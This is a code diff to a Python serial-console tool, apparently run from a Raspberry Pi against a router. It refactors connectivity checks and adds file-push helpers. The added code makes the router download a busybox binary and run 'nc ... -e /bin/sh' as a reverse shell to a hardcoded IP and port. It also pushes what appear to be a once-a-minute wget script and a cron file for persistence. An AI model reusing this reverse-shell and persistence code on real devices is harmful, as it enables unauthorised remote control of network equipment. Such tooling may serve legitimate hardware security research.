@@ -256,39 +256,39 @@ def check_networking(ser):
     """
         Checks if the raspberry and the router are in the same network
     """
+    try: 
+        raspberry_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+        device_ip = send_command(ser, 'ifconfig | grep "inet"').split()[1].replace("addr:", "")
 
-    raspberry_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
-    device_ip = send_command(ser, 'ifconfig | grep "inet"').split()[1].replace("addr:", "")
+        print()
+        print("\n● Checking connectivity:")
+        print("+--------------------------------+")
+        print("|  " + Fore.YELLOW + "Raspberry IP: " + Fore.WHITE + raspberry_ip + "  |")
+        print("|  " + Fore.YELLOW + "Device    IP: " + Fore.WHITE + device_ip + "  |")
+        print("+--------------------------------+")
 
-    print()
-    print("\n● Checking connectivity:")
-    print("+--------------------------------+")
-    print("+  " + Fore.YELLOW + "Raspberry IP: " + Fore.WHITE + raspberry_ip + "  +")
-    print("+  " + Fore.YELLOW + "Device    IP: " + Fore.WHITE + device_ip + "  +")
-    print("+--------------------------------+")
+        if raspberry_ip.rsplit(".")[0] == device_ip.rsplit(".")[0]:
 
-    if raspberry_ip.rsplit(".")[0] == device_ip.rsplit(".")[0]:
+            print(Fore.GREEN + "-----> Raspberry and Device on the same network ✓")
+            return True, raspberry_ip
 
-        print(Fore.GREEN + " ------> Raspberry and Device on the same network ✓\n")
-        return True, raspberry_ip
+        else:
+            print(
+                Fore.RED + "▬ The device and the Raspberry Pi are not in the same network, please connect the Rasperry to "
+                           "the router")
 
-    else:
-        print(
-            Fore.RED + "▬ The device and the Raspberry Pi are not in the same network, please connect the Rasperry to "
-                       "the router")
-
-        return False, raspberry_ip
+            return False, raspberry_ip
+    
+    
+    except Exception as error:
+        print(Fore.RED + "Error getting device ip")
+        print(error)
 
 
 def check_web_server():
     """
         Checks if the raspberry has Apache running (to do a wget on the router and gets the binaries)
     """
-
-    print()
-    print(Fore.CYAN + "+------------------------+")
-    print(Fore.CYAN + "|  CHECKING WEB SERVER   |")
-    print(Fore.CYAN + "+------------------------+")
 
     try:
         request = requests.get("http://localhost")
@@ -307,10 +307,37 @@ def check_web_server():
     return False
 
 
+def copy_file(ser, file_path, final_path):
+    
+    network_status, rpi_ip = check_networking(ser)
+    
+    file_name = file_path.split("/")[-1]
+    copy_path = "/var/www/html/{}".format(file_name)
+    
+
+    try:
+        copyfile(file_path, copy_path)
+
+        if check_web_server() and network_status:
+            send_command(ser, "wget -O {} http://{}/{}".format(final_path, rpi_ip, file_name))
+            print(Fore.GREEN + "-----> {} copied succesfully ✓".format(file_name))
+            
+
+    except Exception as error:
+
+        print(Fore.RED + "Error pushing {} file, error -> ".format(file_name))
+
+
+
 def copy_busybox(ser):
     """
         Copy the busybox binary to the router via wget from the router to the raspi /var/www/html
     """
+    print()
+    print(Fore.CYAN + "+------------------------+")
+    print(Fore.CYAN + "|    COPYING BUSYBOX     |")
+    print(Fore.CYAN + "+------------------------+")
+    
     network_status, rpi_ip = check_networking(ser)
 
     try:
@@ -319,6 +346,7 @@ def copy_busybox(ser):
         if check_web_server() and network_status:
             send_command(ser, "wget -O /tmp/busybox_el http://{}/busybox_mipsel".format(rpi_ip))
             send_command(ser, "chmod +x /tmp/busybox_el")
+            print(Fore.GREEN + "-----> Busybox copied succesfully ✓")
 
     except Exception as error:
 
@@ -330,7 +358,8 @@ def get_reverse_shell(ser, ip, port):
     """
         Send a reverse shell connection to the ip and port provided
     """
-    send_command(ser, "/tmp/busybox_el {} {} -e /bin/sh &".format(ip, port))
+    print("\n● Setting reverse shell to {}:{}".format(ip, port))
+    send_command(ser, "/tmp/busybox_el nc {} {} -e /bin/sh &".format(ip, port))
 
 
 def auto_mode():
@@ -357,6 +386,7 @@ def auto_mode():
             response = input("\nDo you want to open the terminal? (Y/N) ")
 
             if response.upper() == "Y":
+                print(Fore.CYAN + " To exit the terminal and finish the program just enter 'exit from terminal' on the command line")
                 get_terminal(ser)
 
             ducks()
@@ -372,8 +402,18 @@ def test_mode():
 
         if check_if_terminal(ser):
             get_info(ser)
+            copy_busybox(ser)
+            get_reverse_shell(ser, "192.168.31.127", 4444)
+            copy_file(ser, "/home/pi/Documents/wget_each_minute.sh", "/tmp/wget_each_minute.sh")
+            copy_file(ser, "/home/pi/Documents/one_minute_cron", "/tmp/one_minute_cron")
+            
+            
+            response = input("\n● Do you want to open the terminal? (Y/N) ")
 
-            get_terminal(ser)
+            if response.upper() == "Y":
+                print(Fore.CYAN + "\n  To exit the terminal and finish the program just enter 'exit from terminal' on the command line\n")
+                get_terminal(ser)
+
             ducks()
 
 
@@ -417,6 +457,9 @@ def main():
 
         if sys.argv[1] == "-d" or sys.argv[1] == "--debug":
             test_mode()
+            
+        if sys.argv[1] == "-r" or sys.argv[1] == "--reverse_shell":
+            pass
 
     else:
         auto_mode()
